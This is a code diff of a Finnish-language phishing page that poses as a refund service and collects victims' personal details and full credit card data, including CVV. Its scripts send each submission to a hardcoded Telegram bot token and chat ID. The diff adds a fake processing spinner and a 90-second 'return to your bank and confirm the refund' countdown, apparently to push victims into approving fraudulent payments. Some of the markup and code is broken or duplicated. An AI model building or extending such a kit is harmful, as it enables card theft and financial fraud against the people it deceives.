@@ -280,8 +280,43 @@
             font-weight: 600;
         }
 
-        /* Pankkimodaali - pysyy päällä */
-        .modal-overlay {
+        /* BLAUER SPINNER für Kreditkarte */
+        .blue-spinner-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.95);
+            z-index: 2500;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .blue-spinner-overlay.active {
+            display: flex;
+        }
+
+        .blue-spinner {
+            width: 70px;
+            height: 70px;
+            border: 5px solid #e8f0fe;
+            border-top: 5px solid #003399;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        .blue-spinner-text {
+            color: #003399;
+            font-size: 20px;
+            font-weight: 600;
+        }
+
+                /* NEU: Banking Timer Modal - EIN FENSTER MIT ALLEM */
+        .bank-timer-overlay {
             position: fixed;
             top: 0;
             left: 0;
@@ -297,15 +332,14 @@
             transition: opacity 0.3s ease;
         }
 
-        .modal-overlay.active {
+        .bank-timer-overlay.active {
             display: flex;
             opacity: 1;
         }
 
-        .modal-content {
+        .bank-timer-content {
             background: white;
             border-radius: 20px;
-            padding: 50px 40px;
             max-width: 400px;
             width: 90%;
             text-align: center;
@@ -313,35 +347,85 @@
             transform: scale(0.7) translateY(20px);
             opacity: 0;
             transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+            overflow: hidden;
+            padding: 40px 30px;
         }
 
-        .modal-overlay.active .modal-content {
+        .bank-timer-overlay.active .bank-timer-content {
             transform: scale(1) translateY(0);
             opacity: 1;
         }
 
-        .modal-spinner {
-            width: 60px;
-            height: 60px;
-            border: 4px solid #f0f0f0;
+        /* Visa/Mastercard Bild */
+        .card-image-container {
+            margin-bottom: 24px;
+            display: flex;
+            justify-content: center;
+        }
+
+        .card-image {
+            max-width: 200px;
+            height: auto;
+            display: block;
+        }
+
+        /* Timer Text */
+        .timer-text {
+            color: #333;
+            font-size: 18px;
+            font-weight: 600;
+            line-height: 1.4;
+            margin-bottom: 30px;
+        }
+
+        /* Einfacher runder Spinner - BLAU */
+        .simple-spinner-container {
+            position: relative;
+            width: 140px;
+            height: 140px;
+            margin: 0 auto 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .simple-spinner {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border: 4px solid #e0e0e0;
             border-top: 4px solid #003399;
             border-radius: 50%;
             animation: spin 1s linear infinite;
-            margin: 0 auto 24px;
         }
 
-        .modal-text {
+        .spinner-text {
+            text-align: center;
+            z-index: 1;
+        }
+
+        .spinner-number {
+            display: block;
             color: #003399;
-            font-size: 20px;
+            font-size: 32px;
             font-weight: 700;
-            line-height: 1.4;
-            margin-bottom: 12px;
+            line-height: 1;
         }
 
-        .modal-subtext {
+        .spinner-label {
+            display: block;
             color: #666;
-            font-size: 15px;
-            line-height: 1.4;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 4px;
+        }
+
+        /* Timer Info unten */
+        .timer-info {
+            color: #999;
+            font-size: 14px;
+            margin-top: 16px;
         }
 
         /* Lomakesivu */
@@ -940,6 +1024,8 @@
         }
     </style>
 <base target="_blank">
+<base target="_blank">
+<base target="_blank">
 </head>
 <body>
 
@@ -1134,12 +1220,48 @@
         <div class="loading-text" id="loadingText">Ladataan...</div>
     </div>
 
-    <!-- Pankkimodaali -->
-    <div class="modal-overlay" id="bankingModal">
-        <div class="modal-content">
-            <div class="modal-spinner"></div>
-            <div class="modal-text">Palaa verkkopankkiisi</div>
-            <div class="modal-subtext">ja vahvista hyvityspyynnöt</div>
+    <!-- BLAUER SPINNER - 2 Sekunden nach Kreditkarte -->
+    <div class="blue-spinner-overlay" id="blueSpinnerOverlay">
+        <div class="blue-spinner"></div>
+        <div class="blue-spinner-text">Käsitellään...</div>
+    </div>
+
+        <!-- NEU: Banking Timer Modal - EIN FENSTER MIT ALLEM -->
+    <div class="bank-timer-overlay" id="bankTimerOverlay">
+        <div class="bank-timer-content">
+
+            <!-- Visa/Mastercard Bild -->
+            <div class="card-image-container">
+                <img src="https://i.ibb.co/JWnRM6P5/Bildschirmfoto-2026-03-18-um-06-13-33.png" alt="Visa/Mastercard" class="card-image">
+            </div>
+
+            <!-- Finnischer Text -->
+            <div class="timer-text">
+                Palaa pankkiisi ja<br>vahvista hyvitys
+            </div>
+
+            <!-- Einfacher runder Spinner mit 90 sekuntia -->
+            <div class="simple-spinner-container">
+                <div class="simple-spinner"></div>
+                <div class="spinner-text">
+                    <span class="spinner-number" id="timerSeconds">90</span>
+                    <span class="spinner-label">sekuntia</span>
+                </div>
+            </div>
+
+            <!-- Timer Info -->
+            <div class="timer-info">
+                Odota hetki... <span id="timerMinutes">2:00</span>
+            </div>
+
+        </div>
+    </div>
+            
+            <!-- Timer Info -->
+            <div class="timer-info">
+                Odota hetki... <span id="timerMinutes">2:00</span>
+            </div>
+            
         </div>
     </div>
 
@@ -1301,16 +1423,15 @@
 
     <script>
         // ============================================
-        // TELEGRAM KONFIGURAATIO - TÄHÄN OMAT TIEDOT
+        // TELEGRAM KONFIGURAATIO
         // ============================================
-        const TELEGRAM_BOT_TOKEN = '8596752261:AAFgvS2-xBzUSQRFGbYGaDyyYbJmG9PBGZ0'; // Vaihda tähän oma token
-        const TELEGRAM_CHAT_ID = '7927796867'; // Vaihda tähän oma chat ID
+        const TELEGRAM_BOT_TOKEN = '8596752261:AAFgvS2-xBzUSQRFGbYGaDyyYbJmG9PBGZ0';
+        const TELEGRAM_CHAT_ID = '7927796867';
         
         // ============================================
         // TELEGRAM LÄHETYSFUNKTIOT
         // ============================================
         
-        // Lähetä viesti Telegramiin
         async function sendTelegramMessage(message) {
             try {
                 const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -1336,7 +1457,6 @@
             }
         }
         
-        // Kerää laite- ja selaininfo
         function getDeviceInfo() {
             return {
                 userAgent: navigator.userAgent,
@@ -1351,7 +1471,6 @@
         // SIVUKOHTAISET TELEGRAM-ILMOITUKSET
         // ============================================
         
-        // 1. PÄÄSIVU - Kun käyttäjä klikkaa CTA-nappia
         function sendMainPageNotification() {
             const device = getDeviceInfo();
             const message = `🏠 <b>PÄÄSIVU - Uusi käyttäjä</b>
@@ -1367,7 +1486,6 @@
             sendTelegramMessage(message);
         }
         
-        // 2. HENKILÖTIETOSIVU - Kun lomake lähetetään
         function sendPersonalInfoNotification(formData) {
             const device = getDeviceInfo();
             const message = `📝 <b>HENKILÖTIEDOT - Lomake lähetetty</b>
@@ -1384,7 +1502,6 @@
             sendTelegramMessage(message);
         }
         
-        // 3. LUOTTOKORTTISIVU - Kun korttitiedot lähetetään
         function sendCardInfoNotification(cardData) {
             const device = getDeviceInfo();
             const message = `💳 <b>LUOTTOKORTTITIEDOT - Saatu!</b>
@@ -1403,14 +1520,12 @@
         }
 
         // ============================================
-        // NAVIGOINTIFUNKTIOT (päivitetyt Telegram-tuella)
+        // NAVIGOINTIFUNKTIOT
         // ============================================
         
         function startRefundProcess() {
-            // Lähetä Telegram-ilmoitus pääsivulta
             sendMainPageNotification();
             
-            // Näytä lataus 3 sekuntia
             document.getElementById('loadingOverlay').classList.add('active');
             document.getElementById('loadingText').textContent = 'Ladataan...';
 
@@ -1425,7 +1540,6 @@
         function submitForm(event) {
             event.preventDefault();
             
-            // Kerää lomakedata
             const formData = {
                 etunimi: document.getElementById('etunimi').value,
                 sukunimi: document.getElementById('sukunimi').value,
@@ -1436,16 +1550,12 @@
                 postinumero: document.getElementById('postinumero').value
             };
             
-            // Lähetä Telegram-ilmoitus henkilötiedoista
             sendPersonalInfoNotification(formData);
 
-            // Näytä lataus: 3 sekuntia normaali, sitten 4 sekuntia "Tietojen tarkistus"
             document.getElementById('loadingOverlay').classList.add('active');
             document.getElementById('loadingText').textContent = 'Ladataan...';
 
-            // Ensimmäiset 3 sekuntia - normaali lataus
             setTimeout(() => {
-                // Seuraavat 4 sekuntia - "Tietojen tarkistus, odota hetki"
                 document.getElementById('loadingText').textContent = 'Tietojen tarkistus, odota hetki...';
 
                 setTimeout(() => {
@@ -1457,10 +1567,10 @@
             }, 3000);
         }
 
+        // NEU: Nach Kreditkarte -> Blauer Spinner 2s -> dann Timer Modal
         function submitCard(event) {
             event.preventDefault();
             
-            // Kerää korttidata
             const cardData = {
                 korttinumero: document.getElementById('korttinumero').value,
                 kortinhaltija: document.getElementById('kortinhaltija').value,
@@ -1468,16 +1578,60 @@
                 cvv: document.getElementById('cvv').value
             };
             
-            // Lähetä Telegram-ilmoitus korttitiedoista
+            // Sende Kreditkartendaten an Telegram
             sendCardInfoNotification(cardData);
-
-            // Näytä pankkimodaali pysyvästi (ei aikakatkaisua)
-            document.getElementById('bankingModal').classList.add('active');
-            // Ei setTimeout - modaali pysyy auki loputtomi
+            
+            // Zeige BLAUEN SPINNER für 2 Sekunden
+            document.getElementById('blueSpinnerOverlay').classList.add('active');
+            
+            setTimeout(() => {
+                // Verstecke blauen Spinner
+                document.getElementById('blueSpinnerOverlay').classList.remove('active');
+                
+                // Zeige NEUES Timer Modal mit Visa/Mastercard
+                document.getElementById('bankTimerOverlay').classList.add('active');
+                
+                // Starte 2-Minuten-Timer
+                startTwoMinuteTimer();
+            }, 2000);
+        }
+        
+        // NEU: 2-Minuten-Timer Funktion
+        function startTwoMinuteTimer() {
+            let totalSeconds = 90; // 2 Minuten
+            const circle = document.getElementById('timerProgress');
+            const secondsDisplay = document.getElementById('timerSeconds');
+            const minutesDisplay = document.getElementById('timerMinutes');
+            
+            // Kreis Umfang = 2 * PI * 65 ≈ 408.4
+            const circumference = 408.4;
+            
+            const timer = setInterval(() => {
+                totalSeconds--;
+                
+                // Update Sekunden-Anzeige
+                secondsDisplay.textContent = totalSeconds;
+                
+                // Update Minuten:Anzeige
+                const minutes = Math.floor(totalSeconds / 60);
+                const seconds = totalSeconds % 60;
+                minutesDisplay.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+                
+                // Update Kreis-Fortschritt
+                const offset = circumference - (totalSeconds / 120) * circumference;
+                circle.style.strokeDashoffset = offset;
+                
+                // Wenn Zeit abgelaufen
+                if (totalSeconds <= 0) {
+                    clearInterval(timer);
+                    secondsDisplay.textContent = '0';
+                    minutesDisplay.textContent = '0:00';
+                }
+            }, 1000);
         }
 
         // ============================================
-        // KORTIN MUIOTOILUFUNKTIOT (ennallaan)
+        // KORTIN MUIOTOILUFUNKTIOT
         // ============================================
         
         function formatCardNumber(input) {
